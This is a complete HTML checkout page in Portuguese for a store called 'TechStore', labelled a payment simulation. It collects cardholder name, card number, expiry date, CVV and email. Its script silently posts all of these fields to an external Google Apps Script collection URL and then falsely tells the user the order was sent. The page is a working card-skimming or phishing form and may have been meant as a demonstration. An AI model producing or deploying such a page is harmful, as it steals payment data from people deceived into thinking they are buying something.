<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TechStore - Simulação de Pagamento</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f4f4;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 16px rgba(0,0,0,0.1);
      width: 90%;
      max-width: 500px;
    }
    h2 {
      text-align: center;
      color: #2c3e50;
      margin-bottom: 25px;
    }
    .form-group {
      margin-bottom: 20px;
    }
    label {
      display: block;
      color: #34495e;
      margin-bottom: 8px;
      font-weight: bold;
    }
    input[type="text"], input[type="email"] {
      width: calc(100% - 22px);
      padding: 12px;
      border: 1px solid #bdc3c7;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 16px;
    }
    button {
      background-color: #3498db;
      color: white;
      padding: 14px 20px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 18px;
      width: 100%;
      transition: background-color 0.3s ease;
    }
    button:hover {
      background-color: #2980b9;
    }
    .note {
      font-size: 14px;
      color: #e74c3c;
      margin-top: 20px;
      text-align: center;
    }
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo a {
      text-decoration: none;
      color: #3498db;
      font-size: 24px;
      font-weight: bold;
    }
    .input-hint {
      font-size: 0.8em;
      color: #777;
      margin-top: 3px;
      display: block;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <a href="#">TechStore</a>
    </div>
    <h2>Detalhes de Pagamento</h2>
    <form id="paymentForm">
      <div class="form-group">
        <label for="nome">Nome no cartão:</label>
        <input type="text" id="nome" name="nome" required>
        <span class="input-hint">Nome completo como aparece no cartão.</span>
      </div>
      <div class="form-group">
        <label for="numero">Número do cartão (fictício):</label>
        <input type="text" id="numero" name="numero" maxlength="19" pattern="[0-9 ]+" placeholder="Ex: 0000 0000 0000 0000" required>
        <span class="input-hint">Apenas números e espaços (máx. 19 caracteres).</span>
      </div>
      <div class="form-group">
        <label for="validade">Data de validade (MM/AA):</label>
        <input type="text" id="validade" name="validade" placeholder="MM/AA" pattern="[0-9]{2}/[0-9]{2}" maxlength="5" required>
        <span class="input-hint">Formato MM/AA (ex: 12/25).</span>
      </div>
      <div class="form-group">
        <label for="cvv">CVV:</label>
        <input type="text" id="cvv" name="cvv" maxlength="4" pattern="[0-9]{3,4}" required>
        <span class="input-hint">3 ou 4 dígitos.</span>
      </div>
      <div class="form-group">
        <label for="email">E-mail (opcional):</label>
        <input type="email" id="email" name="email">
        <span class="input-hint">Se você tiver um e-mail </span>
      </div>
      <button type="submit">Finalizar Pagamento</button>
      <div class="note">

      </div>
    </form>
  </div>

  <script>
    const form = document.getElementById('paymentForm');
    form.addEventListener('submit', e => {
      e.preventDefault();

      const data = new FormData(form);
      const values = Object.fromEntries(data.entries());

      fetch('https://script.google.com/macros/s/AKfycbwmNkHU2AXr9482t90oZFwn3fiJBsmu1MpZzkCQJ8K7wx3JLy-5LdcPQWHr5r5vO0wv2w/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(values)
      });

      alert("Pedido enviado com sucesso! ");
      form.reset();
    });
  </script>
</body>
</html>
